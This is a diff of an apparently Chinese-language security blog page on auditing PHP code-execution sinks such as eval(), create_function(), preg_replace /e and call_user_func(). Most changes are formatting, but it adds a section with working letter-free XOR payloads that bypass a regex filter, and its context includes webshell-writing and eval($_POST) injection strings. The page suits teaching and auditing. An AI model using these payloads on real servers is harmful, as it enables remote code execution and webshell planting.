@@ -494,21 +494,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-03-09
+                    2021-03-10
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.3k
+                    2.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
+                    11 分
                 </div>
                 
 
@@ -554,7 +554,7 @@
 <span class="token comment" spellcheck="true">// 写webshell</span>
 <span class="token punctuation">{</span>$<span class="token punctuation">{</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
  <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">.</span>php<span class="token operator">&amp;</span><span class="token number">0</span><span class="token operator">=</span><span class="token number">1111111</span></code></pre>
-<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="eval-函数漏洞利用-1"><a href="#eval-函数漏洞利用-1" class="headerlink" title="eval()函数漏洞利用(1)"></a>eval()函数漏洞利用(1)</h2><p><strong>源码</strong></p>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="eval-函数漏洞利用-1"><a href="#eval-函数漏洞利用-1" class="headerlink" title="eval()函数漏洞利用(1)"></a><code>eval()</code>函数漏洞利用<code>(1)</code></h2><p><strong>源码</strong></p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token comment" spellcheck="true">// 参数接收点</span>
 <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -587,7 +587,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token comment" spellcheck="true">// echo $ret = 1; eval($_POST['root']);</span></code></pre>
 </li>
 </ol>
-<h2 id="eval-函数漏洞利用-2"><a href="#eval-函数漏洞利用-2" class="headerlink" title="eval()函数漏洞利用(2)"></a>eval()函数漏洞利用(2)</h2><p><strong>源码</strong>：</p>
+<h2 id="eval-函数漏洞利用-2"><a href="#eval-函数漏洞利用-2" class="headerlink" title="eval()函数漏洞利用(2)"></a><code>eval()</code>函数漏洞利用<code>(2)</code></h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token comment" spellcheck="true">// 接收GET参数</span>
 <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -614,7 +614,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 </li>
 </ol>
-<h2 id="eval-函数漏洞利用-3"><a href="#eval-函数漏洞利用-3" class="headerlink" title="eval()函数漏洞利用(3)"></a>eval()函数漏洞利用(3)</h2><p><strong>源码</strong>：</p>
+<h2 id="eval-函数漏洞利用-3"><a href="#eval-函数漏洞利用-3" class="headerlink" title="eval()函数漏洞利用(3)"></a><code>eval()</code>函数漏洞利用<code>(3)</code></h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\$ret = strtolower(\"$data\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token variable">$ret</span><span class="token punctuation">;</span></code></pre>
@@ -643,7 +643,37 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 </li>
 </ol>
-<h2 id="string2array-1"><a href="#string2array-1" class="headerlink" title="string2array(1)"></a>string2array(1)</h2><p><strong>源码</strong>：</p>
+<h2 id="eval-函数漏洞利用-4"><a href="#eval-函数漏洞利用-4" class="headerlink" title="eval()函数漏洞利用(4)"></a><code>eval()</code>函数漏洞利用<code>(4)</code></h2><p><strong>源码</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[a-zA-Z]/"</span><span class="token punctuation">,</span> <span class="token string">"$input"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p><strong>利用姿势</strong>：</p>
+<ol>
+<li><p>使用如下<code>payload</code>可以拿到Webshell操作结果如下图所示。</p>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/index.php?input=$_="`{{{"^"?&lt;>/";  ${$_}[_](${$_}[__]);&amp;_=assert&amp;__=phpinfo();</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/index.php?input=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo</span></code></pre>
+</li>
+</ol>
+<ol start="2">
+<li><p>代码执行过程分析。</p>
+<pre class=" language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/index.php?input=$_="`{{{"^"?&lt;>/";  ${$_}[_](${$_}[__]);&amp;_=assert&amp;__=phpinfo();</span>
+http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/index.php?input=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo</span>
+
+<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\$ret = strtolower(\"$data\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+<span class="token comment" spellcheck="true">// 拼接含后门语句</span>
+<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 提升语句运行优先级</span>
+<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token string">"${eval($_POST[1])}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 闭合函数、闭合字符</span>
+<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+</li>
+</ol>
+<h2 id="string2array-1"><a href="#string2array-1" class="headerlink" title="string2array(1)"></a>string2array<code>(1)</code></h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$data</span> <span class="token operator">=</span> "<span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'aaaa'</span><span class="token punctuation">,</span>
     <span class="token string">'b'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'222222'</span><span class="token punctuation">,</span>
@@ -680,7 +710,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
     <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 </li>
 </ol>
-<h2 id="string2array-2"><a href="#string2array-2" class="headerlink" title="string2array(2)"></a>string2array(2)</h2><p><strong>源码</strong>：</p>
+<h2 id="string2array-2"><a href="#string2array-2" class="headerlink" title="string2array(2)"></a>string2array<code>(2)</code></h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$data</span> <span class="token operator">=</span> "<span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'aaaa'</span><span class="token punctuation">,</span>
     <span class="token string">'b'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'222222'</span><span class="token punctuation">,</span>
@@ -710,7 +740,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\$arr = $data;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 </li>
 </ol>
-<h2 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h2><p><strong>源码</strong>：</p>
+<h2 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a><code>preg_replace()</code>函数</h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/&lt;data>(.*)&lt;\/data>/e'</span><span class="token punctuation">,</span> <span class="token string">'$ret="\\1";'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token variable">$ret</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// $ret = "   "</span></code></pre>
@@ -744,7 +774,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token comment" spellcheck="true">// 输入参数被匹配到并执行${eval($_POST[1])}</span></code></pre>
 </li>
 </ol>
-<h2 id="create-funciton-函数-1"><a href="#create-funciton-函数-1" class="headerlink" title="create_funciton()函数(1)"></a>create_funciton()函数(1)</h2><p><strong>源码</strong>：</p>
+<h2 id="create-funciton-函数-1"><a href="#create-funciton-函数-1" class="headerlink" title="create_funciton()函数(1)"></a><code>create_funciton()</code>函数<code>(1)</code></h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token comment" spellcheck="true">// $input后面其实应该添加一个;也即</span>
 <span class="token comment" spellcheck="true">// $code =  "echo \$arg.\$arg2.$input;";</span>
@@ -787,7 +817,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token punctuation">}</span></code></pre>
 </li>
 </ol>
-<h2 id="create-funciton-函数-2"><a href="#create-funciton-函数-2" class="headerlink" title="create_funciton()函数(2)"></a>create_funciton()函数(2)</h2><p><strong>源码</strong>：</p>
+<h2 id="create-funciton-函数-2"><a href="#create-funciton-函数-2" class="headerlink" title="create_funciton()函数(2)"></a><code>create_funciton()</code>函数<code>(2)</code></h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$sort_by</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort_by'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$sorter</span> <span class="token operator">=</span> <span class="token string">'strnatcasecmp'</span><span class="token punctuation">;</span>
@@ -837,7 +867,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token punctuation">}</span></code></pre>
 </li>
 </ol>
-<h2 id="usort-函数"><a href="#usort-函数" class="headerlink" title="usort()函数"></a>usort()函数</h2><p><strong>源码</strong>：</p>
+<h2 id="usort-函数"><a href="#usort-函数" class="headerlink" title="usort()函数"></a><code>usort()</code>函数</h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$lambda</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a,$b'</span><span class="token punctuation">,</span> <span class="token string">"return (strlen(\$a)-strlen(\$b)+"</span> <span class="token punctuation">.</span> <span class="token string">"strlen($c));"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'really long string here,boy'</span><span class="token punctuation">,</span> <span class="token string">'this'</span><span class="token punctuation">,</span> <span class="token string">'middle length'</span><span class="token punctuation">,</span> <span class="token string">'largest'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -879,7 +909,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
 </li>
 </ol>
-<h2 id="array-map-函数"><a href="#array-map-函数" class="headerlink" title="array_map()函数"></a>array_map()函数</h2><p><strong>源码</strong>：</p>
+<h2 id="array-map-函数"><a href="#array-map-函数" class="headerlink" title="array_map()函数"></a><code>array_map()</code>函数</h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
@@ -914,7 +944,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token punctuation">}</span></code></pre>
 </li>
 </ol>
-<h2 id="call-user-func-函数"><a href="#call-user-func-函数" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h2><p><strong>源码</strong>：</p>
+<h2 id="call-user-func-函数"><a href="#call-user-func-函数" class="headerlink" title="call_user_func()函数"></a><code>call_user_func()</code>函数</h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">'assert'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 <p><strong>利用姿势</strong>：</p>
 <ol>
@@ -929,7 +959,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">'assert'</span><span class="token punctuation">,</span> <span class="token string">'eval("$_POST[1];")'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
 </li>
 </ol>
-<h2 id="call-user-func-array-函数"><a href="#call-user-func-array-函数" class="headerlink" title="call_user_func_array()函数"></a>call_user_func_array()函数</h2><p><strong>源码</strong>：</p>
+<h2 id="call-user-func-array-函数"><a href="#call-user-func-array-函数" class="headerlink" title="call_user_func_array()函数"></a><code>call_user_func_array()</code>函数</h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// // 仅执行索引为0的参数</span>
 <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'eval($_GET[1]);'</span><span class="token punctuation">,</span> <span class="token string">'eval($_GET[2]);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string">'assert'</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 数组中可执行的参数与回调方法中的参数个数有关</span></code></pre>
@@ -945,7 +975,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <pre class=" language-php"><code class="language-php"></code></pre>
 </li>
 </ol>
-<h2 id="array-filter-函数"><a href="#array-filter-函数" class="headerlink" title="array_filter()函数"></a>array_filter()函数</h2><p><strong>利用条件</strong>：</p>
+<h2 id="array-filter-函数"><a href="#array-filter-函数" class="headerlink" title="array_filter()函数"></a><code>array_filter()</code>函数</h2><p><strong>利用条件</strong>：</p>
 <ul>
 <li><code>version &lt; 7.4</code></li>
 </ul>
@@ -981,7 +1011,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <pre class=" language-php"><code class="language-php"></code></pre>
 </li>
 </ol>
-<h2 id="preg-replace-callback-函数"><a href="#preg-replace-callback-函数" class="headerlink" title="preg_replace_callback()函数"></a>preg_replace_callback()函数</h2><p><strong>源码</strong>：</p>
+<h2 id="preg-replace-callback-函数"><a href="#preg-replace-callback-函数" class="headerlink" title="preg_replace_callback()函数"></a><code>preg_replace_callback()</code>函数</h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token keyword">function</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
@@ -999,7 +1029,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
 <pre class=" language-php"><code class="language-php"></code></pre>
 </li>
 </ol>
-<h2 id="addslashes-绕过"><a href="#addslashes-绕过" class="headerlink" title="addslashes()绕过"></a>addslashes()绕过</h2><p><strong>源码</strong>：</p>
+<h2 id="addslashes-绕过"><a href="#addslashes-绕过" class="headerlink" title="addslashes()绕过"></a><code>addslashes()</code>绕过</h2><p><strong>源码</strong>：</p>
 <pre class=" language-php"><code class="language-php"><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 过滤单引号有效</span>
 <span class="token keyword">echo</span> <span class="token variable">$input</span><span class="token punctuation">;</span>
 <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"\$ret = \"$input\";"</span><span class="token punctuation">;</span>
@@ -1601,7 +1631,7 @@ http<span class="token punctuation">:</span><span class="token comment" spellche
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">296.8k</span>&nbsp;字
+                class="white-color">297.7k</span>&nbsp;字
             
             
             
